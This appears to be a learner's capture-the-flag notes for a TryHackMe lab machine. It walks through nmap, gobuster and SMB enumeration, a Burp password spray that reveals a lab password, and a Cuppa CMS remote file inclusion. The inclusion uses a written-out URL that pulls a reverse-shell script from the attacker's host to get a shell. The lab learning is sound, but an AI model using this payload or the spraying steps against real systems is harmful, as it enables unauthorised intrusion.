![image](./images/basic/img8.png)

target = "10.10.35.177"

nmap scan
```

```
![image](./images/basic/img9.png)

directory enum
```
gobuster dir -w /home/itsme/tryHackMe/trojan/KaliLists/dirb/big.txt -u http://10.10.35.177

```
- admin
- /.htaccess            (Status: 403) [Size: 277]
- /.htpasswd            (Status: 403) [Size: 277]
- /admin
- /squirrelmail

smb enum\
![image](./images/basic/img15.png)
```
enum4linux -a 10.10.35.177
smbclient \\\\10.10.35.177\\anonymous
- attention.txt file
```
![image](./images/basic/img10.png)

logs directory with
- log1.txt(at first thought was usernames) but was password to miles

burpsuite intruder password spraying
![image](./images/basic/img11.png)

cyborg007haloterminator

![image](./images/basic/img12.png)

smb -U milesdyson //10.10.60.167/milesdyson

- important.txt
![image](./images/basic/img13.png)

```
further directory enum 
dirb http://10.10.60.169//45kra24zxs28v3yd/
    - /Administrator 
cuppa cms
    - Remote File Inclusion 

http://10.10.60.169/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.253.0:8000/reverse_shell.php

Am able to get a low priv shell on our listening netcat

Linpeas enum show a possible priv escalation
```
![img](./images/basic/img14.png)
